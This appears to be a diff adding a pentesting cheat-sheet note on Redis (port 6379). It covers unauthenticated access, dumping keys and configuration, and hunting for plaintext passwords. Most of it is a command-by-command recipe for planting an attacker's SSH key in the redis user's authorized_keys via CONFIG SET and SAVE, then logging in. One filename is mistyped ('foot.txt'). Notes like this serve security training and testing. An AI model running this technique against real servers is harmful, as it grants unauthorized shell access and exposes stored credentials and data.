@@ -1,0 +1,132 @@
+---
+Primary_category: "[[PROTOCOLS AND SERVICES]]"
+title: "6379 - REDIS"
+draft: false
+banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+banner_y: 0.88286
+tags:
+cssclasses:
+---
+
+###### PRIMARY CATEGORY →  [[PROTOCOLS AND SERVICES]]
+
+#### *Theory*
+
+---
+
+#### *Remote Connection*
+
+By default, this protocol does not requiere authentication, which means that any actor can connect to the server remotely without providing valid credentials
+
+##### *Redis-cli*
+
+> ***[Redis-cli](https://redis.io/docs/latest/develop/tools/cli/)***
+
+###### *Setup*
+
+```bash
+apt install -y -- redis-tools
+```
+
+###### *Usage*
+
+```bash
+redis-cli -h '<TARGET>'
+```
+
+---
+
+#### *Enumeration*
+
+##### *General Information*
+
+```bash
+INFO
+CONFIG GET *
+```
+
+##### *Keyspaces (Databases)*
+
+They can be listed with the *INFO* command and their data extracted as follows →
+
+```bash
+SELECT <KEYSPACE_INDEX> # e.g. SELECT 0
+KEYS * # List all KEYS within the KEYSPACE
+GET '<KEY>' # Obtain the data from a KEY
+```
+
+---
+
+#### *Sensitive Information*
+
+Even though we mentioned that *redis* does not require credentials by default, it can be configured to require them via the ***redis.conf*** file
+
+The location of this configuration file can be enumerated as follows
+
+```bash
+redis-cli -h '<HOST>'
+> INFO
+```
+
+Therefore, once we gain access to the system or are able to list the content of specific system files, we should look for plain passwords within the configuration file
+
+A user or set of users can be found as well in this file
+
+Note that when *redis authentication* is set to *only password*, the username is ***"default"***
+
+---
+
+#### *SSH*
+
+An operator might be able to write files within the home directory of the redis user, which can be extracted from the output of the **`CONFIG GET *`**
+
+Usually one of these is its home directory
+
+```bash
+/var/lib/redis
+/home/redis/.ssh
+```
+
+If an adversary knows the path, he can set the *working directory* to the *.ssh* directory and write an *authorized_keys* file containing a public key that he created previously
+
+Then, he could authenticated via *SSH* as the *redis* user by providing the private key
+
+To do so, proceed as follows
+
+##### *Generating an SSH Public-Private Key pair*
+
+```bash
+ssh-keygen -t rsa -b 4096 -f redis
+```
+
+##### *Writing the Public Key to a file*
+
+```bash
+printf "\n\n%s\n\n" "$( cat redis.pub )" > foo.txt
+```
+
+##### *Importing the file into Redis*
+
+```bash
+cat foot.txt | redis-cli -h '<TARGET>' -x set ssh_key # KEY Creation
+```
+
+##### *Saving the Public Key as Authorized_keys*
+
+```bash
+redis-cli -h '<TARGET>' config set dir /var/lib/redis/.ssh # Or /home/redis/.ssh
+```
+
+```bash
+redis-cli -h '<TARGET>' config set dbfilename "authorized_keys"
+```
+
+```bash
+redis-cli -h '<TARGET>' save
+```
+
+##### *Pub Key Authentication as Redis user via SSH*
+
+```bash
+ssh -p <PORT> -i redis redis@<TARGET>
+```
